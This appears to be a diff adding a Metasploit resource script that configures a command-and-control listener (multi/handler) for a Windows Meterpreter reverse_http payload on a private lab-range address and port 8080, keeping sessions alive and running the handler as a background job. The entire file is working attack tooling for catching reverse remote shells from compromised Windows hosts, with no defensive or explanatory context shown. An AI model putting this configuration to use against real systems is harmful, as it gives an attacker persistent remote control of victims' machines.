@@ -1,0 +1,9 @@
+# Basic C2 Handler Configuration
+use multi/handler
+set PAYLOAD windows/meterpreter/reverse_http
+set LHOST 192.168.56.10
+set LPORT 8080
+set ExitOnSession false
+set SessionCommunicationTimeout 10
+set SessionExpirationTimeout 3600
+exploit -j -z
